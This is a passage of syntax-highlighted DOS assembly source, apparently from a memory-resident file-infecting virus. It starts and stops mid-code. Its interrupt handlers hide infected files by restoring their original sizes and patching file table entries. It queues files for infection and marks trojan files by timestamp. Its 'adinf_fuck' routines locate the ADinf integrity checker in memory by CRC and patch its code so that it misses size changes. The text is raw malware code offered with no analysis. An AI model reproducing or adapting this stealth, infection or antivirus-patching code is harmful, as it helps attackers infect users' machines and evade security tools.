        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc5">MASKA</span><span class="sc0">   </span><span class="sc4">&lt;</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">st_bx.l</span><span class="sc4">]&gt;,</span><span class="sc0"> </span><span class="sc5">xxxxxx10</span><span class="sc0">  </span><span class="sc1">;R/W    bl</span><span class="sc0">
    </span><span class="sc5">DONE</span><span class="sc0">
</span><span class="sc1">;-+------------------------------------------------------------------------+-</span><span class="sc0">
</span><span class="sc5">bfr_49</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">aft_42</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">aft_00</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">aft_4C</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">bfr_4f</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">bfr_11</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">bfr_12</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">bfr_def</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">@retn</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">aft_def</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">aft_41</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">$ret</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;-+------------------------------------------------------------------------+-</span><span class="sc0">

</span><span class="sc1">;-+------------------------------------------------------------------------+-</span><span class="sc0">
</span><span class="sc5">aft_4E</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">aft_4F</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc5">MOVSEG</span><span class="sc0">  </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">StealthName</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc5">DO</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">CYCLE</span><span class="sc0"> </span><span class="sc5">NZ</span><span class="sc0">
    </span><span class="sc5">DO</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">StealthName</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc5">EXIT</span><span class="sc0"> </span><span class="sc5">E</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc13">'\'
</span><span class="sc0">    </span><span class="sc5">CYCLE</span><span class="sc0"> </span><span class="sc9">NE</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2Fh</span><span class="sc0">     </span><span class="sc1">;get DTA</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DosCall</span><span class="sc0">


    </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Dh</span><span class="sc0">     </span><span class="sc1">;es:bx+1e -0Dh-&gt; ds:di</span><span class="sc0">
    </span><span class="sc5">DO</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:</span><span class="sc5">find_buf_pname</span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">
    </span><span class="sc5">CYCLE</span><span class="sc0"> </span><span class="sc5">LU</span><span class="sc0">
</span><span class="sc5">TROJANFILETIME</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">6</span><span class="sc0"> </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc2">11d</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">6</span><span class="sc0"> </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">6</span><span class="sc0"> </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">:[(</span><span class="sc8">bx</span><span class="sc4">-</span><span class="sc2">0Dh</span><span class="sc4">)</span><span class="sc5">.find_buf_time</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">TROJANFILETIME</span><span class="sc0">
</span><span class="sc1">;DOIF E</span><span class="sc0">
</span><span class="sc1">;int 2bh</span><span class="sc0">
</span><span class="sc1">;DONE</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">added_to_turn</span><span class="sc0">

    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc4">:[(</span><span class="sc8">bx</span><span class="sc4">-</span><span class="sc2">0Dh</span><span class="sc4">)</span><span class="sc5">.find_buf_attr</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0"> </span><span class="sc1">;directory ?</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">no_added_to_turn</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RND_GET_BYTE</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0dh</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">no_added_to_turn</span><span class="sc0">
</span><span class="sc1">;execut</span><span class="sc0">

</span><span class="sc1">;    lea     dx, StealthName</span><span class="sc0">
</span><span class="sc1">;    call    get_crc_just_fname</span><span class="sc0">
</span><span class="sc1">;    jz      no_added_to_turn</span><span class="sc0">
</span><span class="sc1">;-+--added to turn-------------------------------------------------------+-</span><span class="sc0">
</span><span class="sc1">;ds:dx -&gt; InfectTurn</span><span class="sc0">
</span><span class="sc5">added_to_turn</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">StealthName</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">InfectTurn</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
    </span><span class="sc5">movseg</span><span class="sc0">  </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsw</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">

</span><span class="sc1">;int 2bh</span><span class="sc0">
</span><span class="sc1">;    cmp     es:[(bx-0Dh).find_buf_time], TROJANFILETIME</span><span class="sc0">

</span><span class="sc1">;    DOIF Z</span><span class="sc0">
</span><span class="sc1">;        call    InfectName   ;ZFlag</span><span class="sc0">
</span><span class="sc1">;    DONE</span><span class="sc0">
</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">no_added_to_turn</span><span class="sc0">
</span><span class="sc1">;#</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[(</span><span class="sc8">bx</span><span class="sc4">-</span><span class="sc2">0Dh</span><span class="sc4">)</span><span class="sc5">.find_buf_size_l</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;really not need,</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">test_size</span><span class="sc0"> </span><span class="sc1">;ZF=0 - no infected file  ;speed optimization</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">@retn</span><span class="sc0">                               </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">stlts_find_name</span><span class="sc0">           </span><span class="sc1">;extention test ?</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">StealthName</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
    </span><span class="sc5">IfInfJump</span><span class="sc0">   </span><span class="sc9">Name</span><span class="sc0">   </span><span class="sc1">;R/o mode ?</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:</span><span class="sc5">find_buf_size_l</span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">-</span><span class="sc2">0Dh</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:</span><span class="sc5">find_buf_size_h</span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">-</span><span class="sc2">0Dh</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">dosclose</span><span class="sc0">
</span><span class="sc1">;-+------------------------------------------------------------------------+-</span><span class="sc0">

</span><span class="sc1">;-+------------------------------------------------------------------------+-</span><span class="sc0">
</span><span class="sc5">bfr_4E</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc5">movseg</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">       </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">       </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">StealthName</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">       </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">60h</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">       </span><span class="sc5">doscall</span><span class="sc0">
</span><span class="sc1">;-+------------------------------------------------------------------------+-</span><span class="sc0">

</span><span class="sc1">;-+------------------------------------------------------------------------+-</span><span class="sc0">
</span><span class="sc5">bfr_3D</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
    </span><span class="sc5">DOIF</span><span class="sc0"> </span><span class="sc5">NZ</span><span class="sc0">       </span><span class="sc1">;W/O R/W</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Doctor_Name</span><span class="sc0">
        </span><span class="sc5">MASKA</span><span class="sc0">   </span><span class="sc4">&lt;</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">st_ax.l</span><span class="sc4">]&gt;,</span><span class="sc0"> </span><span class="sc5">xxxxxx10</span><span class="sc0">  </span><span class="sc1">;R/W    al</span><span class="sc0">
</span><span class="sc5">$?ret</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
    </span><span class="sc5">DONE</span><span class="sc0">


</span><span class="sc1">;comment #</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄADINFUCKÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_crc_just_fname</span><span class="sc0">
    </span><span class="sc5">cmp_ax_CRC32w</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc12">'A'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'-'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'D'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'i'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'n'</span><span class="sc4">&gt;</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">$?ret</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">save_SP</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">][</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Eh</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
    </span><span class="sc5">DO</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Calculate_CRC</span><span class="sc0">
        </span><span class="sc5">cmp_ax_CRC32w</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc2">74h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C4h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5Eh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E2h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">26h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">81h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Fh</span><span class="sc4">&gt;</span><span class="sc0">
        </span><span class="sc6">lodsw</span><span class="sc0">
        </span><span class="sc5">PASS</span><span class="sc0"> </span><span class="sc9">NE</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc5">DOIF</span><span class="sc0"> </span><span class="sc5">E</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">-</span><span class="sc2">12</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;=1547 for {386}, =1557 for {86}</span><span class="sc0">
            </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">adinf386_fuck</span><span class="sc4">-</span><span class="sc2">1547h</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">-</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">3Dh</span><span class="sc0"> </span><span class="sc1">;fuck 3byte</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">-</span><span class="sc2">5</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">9Ah</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
            </span><span class="sc5">DO</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Calculate_CRC5</span><span class="sc0">
                </span><span class="sc5">cmp_ax_CRC32w</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc2">0Ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Bh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C0h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">74h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc4">&gt;</span><span class="sc0">
                </span><span class="sc5">DOIF</span><span class="sc0"> </span><span class="sc5">E</span><span class="sc0">
                    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0Bh</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc1">; or ax,ax</span><span class="sc0">
                    </span><span class="sc6">ret</span><span class="sc0">
                </span><span class="sc5">DONE</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc0"> </span><span class="sc1">;backward search</span><span class="sc0">
            </span><span class="sc5">CYCLE</span><span class="sc0"> </span><span class="sc5">NZ</span><span class="sc0">
        </span><span class="sc5">DONE</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">9</span><span class="sc0"> </span><span class="sc1">;forward search</span><span class="sc0">
    </span><span class="sc5">CYCLE</span><span class="sc0"> </span><span class="sc5">NS</span><span class="sc0">     </span><span class="sc1">;&lt;8000h</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;-+-[ fucking adinf 9.xx and 10.xx ]---------------------------------------+-</span><span class="sc0">
</span><span class="sc1">;new file size in (ax:dx){86} or eax{386}</span><span class="sc0">
</span><span class="sc1">;old file size in es:[bx.15h]</span><span class="sc0">
</span><span class="sc1">;-+------------------------------------------------------------------------+-</span><span class="sc0">
</span><span class="sc5">MINVIRSIZE</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">6000d</span><span class="sc0">
</span><span class="sc5">MAXVIRSIZE</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">16000d</span><span class="sc0">
</span><span class="sc5">adinf386_fuck</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0"> </span><span class="sc10">far</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">                     </span><span class="sc1">; 1</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">15h</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; 4</span><span class="sc0">
    </span><span class="sc6">les</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">][-</span><span class="sc2">001Eh</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; 3</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">MINVIRSIZE</span><span class="sc0">         </span><span class="sc1">; 3</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">continue_fuck_1f_386</span><span class="sc0">   </span><span class="sc1">; 2</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">                     </span><span class="sc1">; 1</span><span class="sc0">
</span><span class="sc5">end_fuck_1f_386</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">                            </span><span class="sc1">; 1</span><span class="sc0">
</span><span class="sc1">;-+------------------------------------------------------------------------+-</span><span class="sc0">
</span><span class="sc9">org</span><span class="sc0"> </span><span class="sc5">adinf386_fuck</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc0">
</span><span class="sc1">;-+------------------------------------------------------------------------+-</span><span class="sc0">
</span><span class="sc5">adinf_fuck</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0"> </span><span class="sc10">far</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">                 </span><span class="sc1">; 1</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">adinf386_fuck</span><span class="sc0">          </span><span class="sc1">; 3</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">                 </span><span class="sc1">; 1</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">                            </span><span class="sc1">; 1</span><span class="sc0">
</span><span class="sc5">adinf_fuck</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">
</span><span class="sc1">;-+------------------------------------------------------------------------+-</span><span class="sc0">
</span><span class="sc5">continue_fuck_1f_386</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">MAXVIRSIZE</span><span class="sc0">         </span><span class="sc1">; 3</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">                     </span><span class="sc1">; 1</span><span class="sc0">
    </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">end_fuck_1f_386</span><span class="sc0">        </span><span class="sc1">; 2</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc2">808h</span><span class="sc0">  </span><span class="sc1">; 5   ;old command</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">                            </span><span class="sc1">; 1</span><span class="sc0">
</span><span class="sc5">adinf386_fuck</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">
</span><span class="sc1">;-+------------------------------------------------------------------------+-</span><span class="sc0">

</span><span class="sc1">;-+------------------------------------------------------------------------+-</span><span class="sc0">
</span><span class="sc5">aft_6C</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">   </span><span class="sc1">;file opened</span><span class="sc0">
    </span><span class="sc5">DOIF</span><span class="sc0"> </span><span class="sc5">Z</span><span class="sc0">
</span><span class="sc5">aft_3D</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc5">IfInfJump</span><span class="sc0"> </span><span class="sc5">Handle</span><span class="sc0">  </span><span class="sc1">;patch SFT size</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_sft</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc5">di.sf_name</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc5">di.sf_size.hi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc5">di.sf_size.lo</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc5">DONE</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;-+------------------------------------------------------------------------+-</span><span class="sc0">

</span><span class="sc1">;-+------------------------------------------------------------------------+-</span><span class="sc0">
</span><span class="sc5">bfr_3F</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc1">;ret</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_sft</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc5">di.sf_mode</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
    </span><span class="sc5">GOIN</span><span class="sc0"> </span><span class="sc5">NZ</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc5">di.sf_position.hi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">GOIN</span><span class="sc0"> </span><span class="sc5">NZ</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc5">di.sf_position.lo</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">beg_pos_lo</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">18h</span><span class="sc0">
    </span><span class="sc5">DOIF</span><span class="sc0"> </span><span class="sc5">AE</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">noff</span><span class="sc0">
